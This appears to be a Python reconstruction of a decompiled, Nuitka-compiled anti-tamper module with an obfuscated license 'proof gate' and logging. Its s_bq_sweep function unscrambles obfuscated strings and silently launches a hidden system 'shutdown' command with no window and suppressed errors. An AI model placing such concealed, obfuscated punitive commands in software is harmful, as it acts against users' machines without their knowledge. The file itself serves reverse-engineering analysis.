# Recovered module: src.py.com.yun.mao.fea._dr_vx_file
# Static reconstruction from the Nuitka module table, constant chunk and
# Hex-Rays bodies at 0x55dafc0, 0x5672680 and 0x5676af0.
#
# The decoded command order is reconstructed from the decompiled body; the
# proof-gate order is confirmed by the decompiled ``uj_nv_glow`` body.
from __future__ import annotations

import hashlib
import hmac
import subprocess
import time
from typing import Any

from ..link._fds_jm import sec
from . import _cmd_ops, _pl_wd_file

# Module metadata
# nuitka_table_index = 1784
# module_init_rva = 0x5677010
# flags = 0x10


def _tg(n: int) -> bytes:
    """Return the private six-byte witness.

    The genexpr constant order is 17 -> 165 -> 255, so the mix is
    ``((value * 17) ^ 165) & 255`` for four bytes plus ``to_bytes(2, "big")``.
    """

    value = int(n)
    mixed = bytes((((value * 17) ^ 165) & 255) for _ in range(4))
    return mixed + value.to_bytes(2, "big")


def _mac(key: bytes, parts: bytes | tuple) -> bytes:
    ctx = hmac.new(bytes(key), digestmod=hashlib.sha256)
    if isinstance(parts, (bytes, bytearray, memoryview)):
        parts = (parts,)
    for part in parts:
        ctx.update(bytes(part))
    return ctx.digest()


def _unseal(tag: bytes, cap: Any) -> bool:
    try:
        return bool(_pl_wd_file._unseal(bytes(tag), cap))
    except (AssertionError, TypeError, ValueError):
        return False


def _kid_key(kid: str) -> bytes:
    return hashlib.sha256(str(kid or "").encode("utf-8")).digest()


def _kid_mac(kid: str) -> bytes:
    return _mac(_pl_wd_file._sk, (_tg(75), _kid_key(kid)))


def _noise(x: int) -> int:
    """Mix one integer with the module's confirmed arithmetic slots.

    The decompiled ``_decoy`` body confirms ``v * 1515870810 + 1812433253``,
    the 32-bit mask, the 11/21-bit shifts and the final ``^ 13``.
    """

    value = int(x)
    mixed = (value * 1515870810 + 1812433253) & 0xFFFFFFFF
    return ((mixed << 11) ^ (mixed >> 21) ^ 13) & 0xFFFFFFFF


def _ready() -> bool:
    return bool(_pl_wd_file._ready and _pl_wd_file._sk is not None)


def _chain_ok(obj: Any) -> bool:
    if not _ready():
        return False
    marker = getattr(obj, "chain_ok", True)
    return bool(marker) and bool(_pl_wd_file._ph)


def _obj_ok(obj: Any) -> bool:
    if obj is None:
        return False
    return not bool(getattr(obj, "blocked", False))


def _gy_ok(obj: Any) -> bool:
    result = _cmd_ops.optional_call(obj, ("gy_ok", "_gy_ok", "on_gy_ok"))
    return True if result is None else bool(result)


def _uc_ok(obj: Any) -> bool:
    module = _cmd_ops.load_attr("src.py.com.yun.mao.fea._sq_jqm")
    info = getattr(module, "current_account_info", None)
    if info is None:
        fn = getattr(obj, "account_valid", None)
        return bool(fn()) if callable(fn) else False
    ensure = getattr(info, "ensure_valid", None)
    if callable(ensure):
        try:
            return bool(ensure())
        except Exception:
            return False
    return bool(getattr(info, "ucode", ""))


def _record(now: float, reason: int, entry: int, n: int, ph: int) -> bool:
    try:
        repeated = bool(_pl_wd_file._bump_suspect_locked(float(now)))
    except (AttributeError, TypeError, ValueError):
        repeated = False
    try:
        _pl_wd_file.q_lg(int(reason), int(reason), int(entry), int(n), int(ph))
    except (AttributeError, TypeError, ValueError):
        pass
    return repeated


def _fail(now: float, reason: int, entry: int, n: int, ph: int) -> bool:
    _record(now, reason, entry, n, ph)
    return False


def _decoy(obj: Any) -> None:
    """Consume the decoy slot without mutating persisted proof state."""

    _ = _noise(len(getattr(obj, "kid", ""))) if obj is not None else _noise(0)
    return None


def _fan_hooks(obj: Any) -> bool:
    result = _cmd_ops.optional_call(
        obj,
        ("proof_ok", "_proof_ok", "on_proof_ok", "fan_hooks"),
    )
    return bool(result) if result is not None else False


def s_bq_sweep() -> None:
    """Run the hidden ``shutdown`` command after un-scrambling its name."""

    _sy = sec("sj_ok_7b")
    _z = sec("kv_rm_4p")
    _sp = subprocess
    _src = (
        _sy,
        _z,
        sec("wr_yt_3n"),
        sec("nt_wj_8c"),
        sec("hg_ae_6v"),
        sec("qb_ls_2m"),
        sec("pz_uc_1k"),
        sec("xf_dh_9t"),
    )
    _dst = [""] * 8
    for _i, _j in enumerate((7, 0, 6, 1, 5, 2, 4, 3)):
        _dst[_j] = _src[_i]
    _p = "".join(_dst)
    _exe = sec("dm_fx_5q")
    _flags = _sp.CREATE_NO_WINDOW
    _ch = _sp.DEVNULL
    _cf = _flags
    try:
        _sp.Popen(
            _p,
            *[
                _exe + _item
                for _item in (
                    sec("kv_rm_4p"),
                    sec("lc_zi_0w"),
                    sec("xf_dh_9t"),
                )
            ],
            sec("uy_bp_4h"),
            shell=False,
            stdin=_ch,
            stdout=_sp.DEVNULL,
            stderr=_sp.DEVNULL,
            creationflags=_cf,
        )
    except Exception:
        pass


def uj_nv_glow(obj: Any = None) -> bool:
    """Evaluate the four-stage proof gate and dispatch the hit hook."""

    now = time.time()
    try:
        with _pl_wd_file._g_mz:
            gate = _chain_ok(obj)
            hit = _obj_ok(obj)
            r0 = _pl_wd_file.w_cd(gate, hit, _gy_ok(obj), _uc_ok(obj))
            if r0 != 9:
                return _fail(now, r0, 4, _noise(len(_pl_wd_file._ph)), 0)
        _decoy(obj)
        _g = _fan_hooks(obj)
        return bool(_g or obj is None)
    except Exception:
        return _fail(now, 1, 4, 0, 0)


def h_m8_rim(obj: Any = None) -> None:
    """Public hook entry; the body is the small proof-hook wrapper."""

    try:
        _fan_hooks(obj)
    except Exception:
        return None
    return None

